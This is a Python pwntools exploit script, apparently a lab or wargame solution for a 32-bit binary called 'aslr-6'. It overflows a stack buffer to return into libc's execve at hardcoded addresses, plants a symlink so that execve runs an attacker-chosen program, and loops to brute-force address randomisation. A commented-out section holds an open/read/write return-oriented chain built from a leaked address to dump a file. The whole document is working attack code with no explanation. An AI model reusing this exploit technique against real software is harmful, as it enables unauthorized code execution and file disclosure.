#!/usr/bin/env python

from pwn import *
import os




buf = "A" * 0x88 + "BBBB"

execve = p32(0xb7e2e7e0)
string = p32(0xb7e2e95a)
if os.path.exists("\004"): #"\x04"
    os.unlink("\004")

os.symlink("./A", "\004")

buf += execve + "AAAA" + string + p32(0) + p32(0)

while True:

    p = process('./aslr-6')

    p.sendline(buf)

    p.interactive()

    p.close()


"""
addr_check_func = 0x728
buf += p32(addr_check_func)
buf += p32(0x741)

with open("e.txt", "w") as f:
    f.write(buf)
    f.close

p.sendline(buf)

data = p.recv()
print (data.split())
addr = (data.split())[27]
print (addr)


open_int = int(addr, 16) - 904428
read_int = open_int + 1040
write_int = read_int + 112

open_ = p32(open_int)
read_ = p32(read_int)
write_= p32(write_int)


pop_pop_pop_ret = p32(0x080485b9)

string = p32(0x80486ec)
buf += open_
buf += pop_pop_pop_ret
buf += string
buf += p32(0)
buf += p32(0)

buf += read_
buf += pop_pop_pop_ret
buf += p32(3)
buf += p32(0x804a800)
buf += p32(100)

buf += write_
buf += pop_pop_pop_ret
buf += p32(1)
buf += p32(0x804a800)
buf += p32(100)


with open("e.txt", "w") as f:
    f.write(buf)
    f.close
"""
#print(len(buf))
#p.send(buf)
#print(p.recv())
#time.sleep(0.1)
#p.sendline(str(len(buf)))
#print(p.recv())
#time.sleep(0.1)
"""

p.sendline(buf)
p.interactive()
"""
